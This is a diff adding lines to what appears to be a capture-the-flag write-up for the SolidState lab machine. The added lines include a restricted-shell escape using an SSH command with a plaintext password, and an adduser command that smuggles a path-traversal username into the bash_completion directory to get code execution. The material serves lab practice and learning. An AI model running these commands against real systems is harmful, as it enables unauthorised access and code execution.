@@ -192,3 +192,16 @@ RETR 2
 mindy@solidstate:~$ cat /etc/passwd
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236760143-8d145c84-ff6d-4423-a934-ea6297aefc00.png)
+
+### Restricted Bash to Bash Shell Escape
+```CSS
+▶ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
+```
+
+### Restricted Bash to Bash Shell Escape
+  - Read here: https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html#intended-path
+  - Add User: `hardyboy`
+```CSS
+adduser ../../../../../../../../etc/bash_completion.d hardyboy
+```
+![image](https://user-images.githubusercontent.com/83878909/236778269-50d42f3d-ffb2-46c0-9cf9-3646cb038f16.png)
